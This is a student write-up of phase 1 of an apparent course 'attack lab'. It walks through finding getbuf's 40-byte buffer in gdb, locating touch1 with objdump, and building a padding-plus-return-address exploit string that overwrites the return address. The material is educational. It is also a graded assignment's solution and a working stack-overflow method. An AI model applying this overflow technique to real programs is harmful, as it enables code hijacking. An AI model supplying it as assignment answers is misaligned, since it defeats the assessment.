 


# Phase 1
In phase 1 we are trying to overflow the stack with the exploit string and change the return address of getbuf function to the address of touch1


First we run ctarget executable in gdb, we open the terminal and write

`gdb ctarget`

To inspect the code further we run a break on getbuf and run the code:

```
break getbuf
run
```

To see the disassembled code we type

`disas`

My disassembled getbuf looks like this (see code). This is telling me my buffer's size is 0x28 (40 decimal) allocated for getbuf.

```
(gdb) disas
Dump of assembler code for function getbuf:
=> 0x0000000000401873 <+0>:     sub    $0x28,%rsp
   0x0000000000401877 <+4>:     mov    %rsp,%rdi
   0x000000000040187a <+7>:     callq  0x401afd <Gets>
   0x000000000040187f <+12>:    mov    $0x1,%eax
   0x0000000000401884 <+17>:    add    $0x28,%rsp
   0x0000000000401888 <+21>:    retq   
End of assembler dump
```

Now you know we have the buffer size we know we have to input 40 bytes of padding followed by the return address of the touch1 address.

To find the address the touch1, you need to get the dissasembled code for ctarget executable. We write in console.

`objdump -d ctarget > ctarget_dump.txt`

The dissasembled will be saved in the file ctarget_dump.txt. On that file we need to find touch1's adress.

My ctarget_dump.txt looks like this:

```
0000000000401889 <touch1>:
  401889:	48 83 ec 08          	sub    $0x8,%rsp
  40188d:	c7 05 85 2c 20 00 01 	movl   $0x1,0x202c85(%rip)        # 60451c <vlevel>
  401894:	00 00 00 
  401897:	bf 86 31 40 00       	mov    $0x403186,%edi
  40189c:	e8 2f f4 ff ff       	callq  400cd0 <puts@plt>
  4018a1:	bf 01 00 00 00       	mov    $0x1,%edi
  4018a6:	e8 97 04 00 00       	callq  401d42 <validate>
  4018ab:	bf 00 00 00 00       	mov    $0x0,%edi
  4018b0:	e8 9b f5 ff ff       	callq  400e50 <exit@plt>
```

So the address is `0x401889`
Remember that if you have an intel processor you need to take the little endian into account. So, we write our adress backwards.

I created a text file named phase1.txt, that contains this code:

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /*This is my padding for the buffer of 40 bytes*/
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
89 18 40 00 00 00 00 00 /*The adress of touch1 backwards*/
```

We need to take this file and run it through the program hex2raw, which will generate raw exploit strings

`./hex2raw < phase1.txt > raw-phase1.txt`

Finally, run the raw file

`./ctarget < raw-phase1.txt`

This is the result if your solution is right

```
Cookie: 0x2d274378 //Remember each cookie is different
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!

```
